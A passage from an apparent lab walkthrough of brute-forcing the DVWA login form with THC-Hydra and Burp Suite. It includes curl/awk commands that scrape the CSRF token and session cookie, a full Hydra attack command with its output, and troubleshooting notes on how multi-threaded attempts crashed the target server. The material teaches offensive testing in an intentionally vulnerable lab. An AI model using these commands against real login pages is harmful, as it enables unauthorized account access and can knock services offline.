&lt;p&gt;&lt;img alt="Hydra PoC" src="https://blog.g0tmi1k.com/images/dvwa-login-19.png" /&gt;&lt;/p&gt;

&lt;p&gt;Boom! For the first time, Hydra successfully detected the credentials =).&lt;/p&gt;

&lt;p&gt;A few notes about speed:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If we did not &lt;strong&gt;need Burp to drop the GET requests&lt;/strong&gt;, the attack could be faster. (Could make something quick in Python)?&lt;/li&gt;
&lt;li&gt;If Hydra &lt;strong&gt;detected &lt;code&gt;Location: index.php&lt;/code&gt; as a successful login&lt;/strong&gt;, we could use blacklisting, which means we do not need Burp again, and it would be quicker.&lt;/li&gt;
&lt;li&gt;If we used a &lt;strong&gt;different tool rather than Hydra&lt;/strong&gt; to-do the Burp force, the attack would be quicker. (Could make something quick in &lt;a href="https://blog.g0tmi1k.com/atom.xml#Bash.Template"&gt;Bash&lt;/a&gt;? &lt;a href="https://blog.g0tmi1k.com/atom.xml#Python.Template"&gt;Python&lt;/a&gt;? &lt;a href="https://blog.g0tmi1k.com/atom.xml#L4...Brute.Force..Patator."&gt;Patator&lt;/a&gt;)?&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;I will touch on these issues again towards the end. Let's just finish up doing the attack for the time being.&lt;/p&gt;

&lt;p&gt;Now, everything is ready to go. Let's see what performance tweaks we can make to see if we can speed it up.&lt;/p&gt;

&lt;p&gt;First thing to try is to drop &lt;code&gt;-W &amp;lt;value&amp;gt;&lt;/code&gt;, as no-one else is going to be using the web application. And this login page does not have too many database queries. This will have a huge effect on the speed (hopefully not at the price of the target being stable!)&lt;/p&gt;

&lt;p&gt;After testing again, the next thing we could do is to lower the timeout value &lt;code&gt;-w &amp;lt;value&amp;gt;&lt;/code&gt;. In this setup, this should not affect us too much. As we are on a LAN connection and not going out WAN/Internet, it will have a much quicker response time. So what should the value be? With a quick test, we can find out. Windows XP SP3 has the firewall enabled by default, let's temporarily remove it, so we can send a large IMCP request (aka ping it).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# ping 192.168.1.33 -s 60000 -c 10&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;PING 192.168.1.33 &lt;span class="o"&gt;(&lt;/span&gt;192.168.1.33&lt;span class="o"&gt;)&lt;/span&gt; 60000&lt;span class="o"&gt;(&lt;/span&gt;60028&lt;span class="o"&gt;)&lt;/span&gt; bytes of data.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;60008&lt;/span&gt; bytes from 192.168.1.33: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;128&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;3.88 ms
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;60008&lt;/span&gt; bytes from 192.168.1.33: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;128&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;6.83 ms
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;60008&lt;/span&gt; bytes from 192.168.1.33: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;128&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;6.28 ms
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;60008&lt;/span&gt; bytes from 192.168.1.33: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;128&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;7.29 ms
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;60008&lt;/span&gt; bytes from 192.168.1.33: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;128&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;6.52 ms
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;60008&lt;/span&gt; bytes from 192.168.1.33: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;128&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;7.09 ms
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;60008&lt;/span&gt; bytes from 192.168.1.33: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;128&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;6.01 ms
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;60008&lt;/span&gt; bytes from 192.168.1.33: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;128&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;6.96 ms
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;60008&lt;/span&gt; bytes from 192.168.1.33: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;128&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;7.62 ms
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;60008&lt;/span&gt; bytes from 192.168.1.33: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;128&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;7.60 ms
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;--- 192.168.1.33 ping statistics ---
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;10&lt;/span&gt; packets transmitted, &lt;span class="m"&gt;10&lt;/span&gt; received, 0% packet loss, &lt;span class="nb"&gt;time &lt;/span&gt;9020ms
&lt;/span&gt;&lt;span class="line"&gt;rtt min/avg/max/mdev &lt;span class="o"&gt;=&lt;/span&gt; 3.880/6.611/7.624/1.045 ms
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Ping Results" src="https://blog.g0tmi1k.com/images/dvwa-login-20.png" /&gt;&lt;/p&gt;

&lt;p&gt;We are talking only a few milliseconds for a ~60KB ICMP size. Even with all the overhead of a TCP connection, HTTP request &amp;amp; database query it is not going to be more than a one second response (unless we really start to hammer the target). This all means we do not need to wait long, so &lt;code&gt;-w 1&lt;/code&gt; it is!&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Match.and.Replace"&gt;&lt;/a&gt;
&lt;h3&gt;Match and Replace&lt;/h3&gt;

&lt;p&gt;When using "&lt;strong&gt;Match and Replace&lt;/strong&gt;" inside Burp, I noticed a &lt;strong&gt;different between how the Apache web servers would response compared to Nginx or IIS&lt;/strong&gt;. If the replace value was a valid request (either to an existing or missing page, &lt;code&gt;GET /&lt;/code&gt; or &lt;code&gt;GET /404.php&lt;/code&gt;), or converting method types (to a valid or invalid, &lt;code&gt;HEAD /&lt;/code&gt; or &lt;code&gt;DROP /&lt;/code&gt;) both Apache web servers (&lt;code&gt;192.168.1.22&lt;/code&gt;&amp;amp; &lt;code&gt;192.168.1.33&lt;/code&gt;) would &lt;strong&gt;take over 27 minutes to complete the attack&lt;/strong&gt;! Using timestamps in Burp, I was able to monitor the progress of Hydra. There was roughly one attempt every three seconds, which just so happens to be same as the timeout value used in the Hydra command.&lt;/p&gt;

&lt;p&gt;&lt;img alt="Burp Failing" src="https://blog.g0tmi1k.com/images/dvwa-login-burpfail.png" /&gt;&lt;/p&gt;

&lt;p&gt;However, if the request was drop using Burp (&lt;code&gt;&amp;lt;blank&amp;gt;&lt;/code&gt;) or an invalid request (&lt;code&gt;GET/500&lt;/code&gt;) the attack time would be remarkably quicker, &lt;strong&gt;less than 2 minutes&lt;/strong&gt;. Both Nginx and IIS did not behave any different. &lt;em&gt;This might be used as a method to fingerprint an Apache web server?&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt="Burp Working" src="https://blog.g0tmi1k.com/images/dvwa-login-burpwork.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Troubleshooting.Rambles"&gt;&lt;/a&gt;
&lt;h3&gt;Troubleshooting Rambles&lt;/h3&gt;

&lt;p&gt;If you want to skip some ramblings and/or lots of things that failed, feel free to jump over this section.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Windows XP SP3 &amp;amp; XAMPP does not like to have multiple POST requests sent to DVWA at once. It will just stop responding.&lt;/p&gt;

&lt;p&gt;&amp;lt;troubleshooting&gt;&lt;/p&gt;

&lt;p&gt;Now, this is where it goes horribly wrong (and I'm not fully sure why).&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I decided to increase the thread count &lt;code&gt;-t &amp;lt;value&amp;gt;&lt;/code&gt;. Normally, by doing so, this can speed up the attack, as it will increase the amount of network traffic that is produced. I started off with &lt;code&gt;-t 5&lt;/code&gt;, and straight away noticed that Burp was not sending out any &lt;code&gt;HEAD /&lt;/code&gt; requests, as it was before, so something was not right.&lt;/li&gt;
&lt;li&gt;Upon inspecting Burp, a little bit more, there was not a response for the POST requests, meaning the attacker was sending out an attempt, but the web server was not responding back for some reason. Tried to cURL to it, and noticed the web server was down. Ugh. Did I just DoS the web server?&lt;/li&gt;
&lt;li&gt;After rebooting the target box, I made a manual request to make sure everything was working as normal and then repeated the 5 threads. Again, no &lt;code&gt;HEAD /&lt;/code&gt;, no request tab in Burp and cURL is not working. Connecting to the box, I started up Internet Explorer (v6!) and tried to access &lt;code&gt;http://localhost/DVWA/&lt;/code&gt;. The page was white, and the progress bar was "forever loading" as it was trying to connect but nothing was coming back. So once again Apache had somehow not been receiving requests. &lt;code&gt;netstat&lt;/code&gt; showed the port was open, and the task manager lists the process as still running. Nothing was hogging all the CPU or RAM.&lt;/li&gt;
&lt;li&gt;Once again, rebooted the box and this time, tried with just two threads &lt;code&gt;-t 2&lt;/code&gt;. And once more, the web server goes down. Checking the Apache logs (both &lt;code&gt;access.log&lt;/code&gt; and &lt;code&gt;error.log&lt;/code&gt;) as well as MySQL &amp;amp; PHP none of the services logged any of the brute force requests from Hydra.&lt;/li&gt;
&lt;li&gt;I switched from XAMPP to &lt;a href="http://www.wampserver.com/en/"&gt;WAMP&lt;/a&gt; and tried again, only to find the same issue.&lt;/li&gt;
&lt;li&gt;Reverted back to XAMPP, switched from a service running the process to a user, but it did not have any effect.&lt;/li&gt;
&lt;li&gt;Next, powered off the VM and increased the system resources (getting desperate now) from 512MB to 2GB RAM and 1 CPU to 2 CPU, but even this did not fix it.&lt;/li&gt;
&lt;li&gt;Starting to clutch at straws, what happens if &lt;code&gt;-W 5&lt;/code&gt; was added back in? It was a long shot, as it appears the first POST request was killing it. So sleeping AFTER the request was sent would not have much point.&lt;/li&gt;
&lt;li&gt;Remembering my mistake from before, I tried the final command once more after a reboot; however, this time enabled Burp "invisible proxy mode". Nope. Did not work this time.&lt;/li&gt;
&lt;li&gt;Switching to ZAP proxy did not fix anything either.&lt;/li&gt;
&lt;li&gt;Before I went completely mad, I already had a few other machines and setup for these DVWA modules (Arch Linux &amp;amp; Raspberry Pi, Raspbian &amp;amp; Raspberry Pi 2, Windows XP &amp;amp; XAMPP, Windows Server 2012 &amp;amp; IIS), so I tested the last command on each of the &lt;strong&gt;other three environments and every single one of them worked, when using more than one thread&lt;/strong&gt;!&lt;/li&gt;
&lt;li&gt;Before switching back to Windows XP as the target, I took the same setup for XAMPP and installed it on the Windows 2012 machine and low and behold it worked. So something is wrong with Windows XP setup. As there were so few requests, I did not think it could be "port exhaustion", so maxing out &lt;code&gt;MaxFreeTcbs&lt;/code&gt;, &lt;code&gt;MaxHashTableSize&lt;/code&gt;, &lt;code&gt;MaxUserPort&lt;/code&gt;, &lt;code&gt;TcpTimedWaitDelay&lt;/code&gt; &amp;amp; displaying &lt;code&gt;SynAttackProtect&lt;/code&gt; would not have much effect - but I tried it anyway. Did not fix anything.&lt;/li&gt;
&lt;li&gt;So, trying to brute force DVWA out of the box was not working, but it was working on a different box/machine. But what happens if we try another web application?&lt;/li&gt;
&lt;li&gt;A quick &lt;code&gt;echo 'hello world' &amp;gt; C:/xampp/htdocs/test.html&lt;/code&gt; would load, when cURLing a "crashed" DVWA page (&lt;code&gt;http://192.168.1.33/DVWA/login.php&lt;/code&gt;). Next, was to see if PHP was working using &lt;code&gt;echo '&amp;lt;?php phpinfo(); ?&amp;gt;' &amp;gt; C:/xampp/htdocs/test.php&lt;/code&gt;. I was successfully able to view it when DVWA was not loading.&lt;/li&gt;
&lt;li&gt;Restarting MySQL via the XAMPP control panel did not recover the crashed DVWA, after making a new request to the page. What about the Apache server? It took a little longer than "normal", however, after re-starting it up - DVWA would work! This smells like an Apache/PHP issue!&lt;/li&gt;
&lt;li&gt;Based on this, the issue lies somewhere with Apache &amp;amp; PHP, when running a certain "something"?&lt;/li&gt;
&lt;li&gt;When everything goes wrong and nothing is being logged (even on the max level), it is time to bring out Wireshark!&lt;/li&gt;
&lt;li&gt;So what if we drop using the proxy completely and just sniff with Wireshark? This of course would not work due to the CSRF token becoming incorrect, but at least, does the web server stay up? Short answer: No.&lt;/li&gt;
&lt;li&gt;...I started to become bored and annoyed with this. It works as a single thread and multiple threads on other OS. So it is just this setup, and using a single thread is quick enough for us. I left it like that, as it was not working out of the box (which was the whole point of this), and something somewhere needed to be altered.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;I'm sure there is some PHP configuration option to help me out, or using 3rd party tools (such as &lt;a href="http://www.microsoft.com/technet/sysinternals"&gt;Process Explorer&lt;/a&gt; and &lt;a href="http://www.microsoft.com/technet/sysinternals"&gt;Process Monitor&lt;/a&gt;). But at this point, I did not see too much of a reason to go on.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Screenshot of the Issue&lt;/strong&gt;:&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 192.168.1.33/DVWA/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# rm -f hydra.restore; export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# hydra -l admin -p password -e ns -u -F -t 5 -w 1 -V 192.168.1.33 http-post-form &amp;quot;/DVWA/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;WARNING&lt;span class="o"&gt;]&lt;/span&gt; the waittime you &lt;span class="nb"&gt;set &lt;/span&gt;is low, this can result in erroneous results
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-10-15 22:02:28
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Using HTTP Proxy: http://127.0.0.1:8080
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;3&lt;/span&gt; tasks per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;3&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:1/p:3&lt;span class="o"&gt;)&lt;/span&gt;, ~0 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-post-form on port 80
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;2&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 1&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;3&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 2&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target completed, &lt;span class="m"&gt;0&lt;/span&gt; valid passwords found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-10-15 22:02:30
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# time curl 192.168.1.33/DVWA/login.php&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;^C
&lt;/span&gt;&lt;span class="line"&gt;curl 192.168.1.33/DVWA/login.php  0.01s user 0.00s system 0% cpu 17.924 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl 192.168.1.33/DVWA/login.php&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Multi-thread Killer" src="https://blog.g0tmi1k.com/images/dvwa-login-21.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Notice how the "Response" tab is missing, where it should be next to "Request"? The curl request waited 17 seconds without a response before I stopped it.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Bonus points, between restarting the box after each failed attack... Guess what program was not responding, and stopped the reboot!&lt;/p&gt;

&lt;p&gt;&lt;img alt="Apache Unresponsive" src="https://blog.g0tmi1k.com/images/dvwa-login-22.png" /&gt;&lt;/p&gt;

&lt;p&gt;&amp;lt;/troubleshooting&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Brute.Force..Hydra."&gt;&lt;/a&gt;
&lt;h2&gt;Brute Force (Hydra)&lt;/h2&gt;

&lt;a name="L.strong.Hydra.Main.Command..strong."&gt;&lt;/a&gt;
&lt;h3&gt;&lt;strong&gt;Hydra Main Command&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;Now would be the time to switch attacking to the target (rather than our test lab). We know how to use the tool; we know what to expect from the web application. What we do not know are the credentials to login in "production environments".&lt;/p&gt;

&lt;p&gt;Rather than making a custom wordlist, designed and aim towards our target (such as &lt;a href="https://digi.ninja/projects/cewl.php"&gt;CeWL&lt;/a&gt;), we are going to use to a "general" wordlist instead from &lt;a href="https://github.com/danielmiessler/SecLists"&gt;SecLists&lt;/a&gt;. This contains various defaults and common usernames and passwords.&lt;/p&gt;

&lt;p&gt;A wordlist (sometimes called a dictionary) is just a list of words (or phrases) separated (normally by new lines) in a text file. The file extension does not matter (often &lt;code&gt;.txt&lt;/code&gt;, &lt;code&gt;.dic&lt;/code&gt; or &lt;code&gt;.lst&lt;/code&gt;).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
